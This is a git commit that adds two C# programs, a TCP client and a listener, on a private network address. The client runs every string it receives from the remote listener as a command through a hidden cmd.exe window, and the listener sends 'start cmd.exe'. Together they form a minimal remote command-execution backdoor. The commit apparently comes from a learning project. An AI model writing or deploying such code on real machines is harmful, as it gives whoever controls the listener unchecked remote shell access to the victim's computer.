af0406fa91e3659c6fbdf417b5cfb2345d132c79
Glicy <Ludovic2008@outlook.com>
2024-11-26 16:06:43 +0100

    Initial commit

---
+++ TCPClient/TCPClient/Program.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Net;
+using System.Net.Sockets;
+using System.Diagnostics;
+
+namespace TCPClient
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            int port = 13000;
+            IPAddress server = IPAddress.Parse("192.168.1.172");
+            getMessage(server, ref port);
+            Console.ReadLine();
+        }
+
+        static void getMessage(IPAddress server, ref int port)
+        {
+            try
+            {
+                TcpClient client = new TcpClient(server.ToString(), port);
+
+                NetworkStream stream = client.GetStream();
+                byte[] bytes = new byte[256];
+                string response = string.Empty;
+                
+                while (stream.Read(bytes, 0, bytes.Length) != 0)
+                {
+                    response = System.Text.Encoding.UTF8.GetString(bytes);
+
+                    Process process = new Process();
+                    process.StartInfo.FileName = "cmd.exe";
+                    process.StartInfo.Arguments = response;
+                    process.StartInfo.CreateNoWindow = true;
+                    process.Start();
+
+                    Console.WriteLine("Executed command: " + response);
+                }
+            } catch(Exception e)
+            {
+                Console.Error.WriteLine(e.Message);
+            }
+        }
+    }
+}
---
+++ TCPListener/TCPListener/Program.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Net;
+using System.Net.Sockets;
+
+namespace TCPListener
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            TcpListener server = null;
+
+            try
+            {
+                int port = 13000;
+                IPAddress localIp = IPAddress.Parse("192.168.1.172");
+
+                server = new TcpListener(localIp, port);
+                server.Start();
+
+                TcpClient client = server.AcceptTcpClient();
+
+                NetworkStream stream = client.GetStream();
+
+                byte[] bytes = System.Text.Encoding.ASCII.GetBytes("start cmd.exe");
+                stream.Write(bytes, 0, bytes.Length);
+                Console.WriteLine("Sent !");
+                Console.ReadLine();
+
+            }
+            catch (Exception ex)
+            {
+                Console.Error.WriteLine(ex.Message);
+            }
+        }
+    }
+}
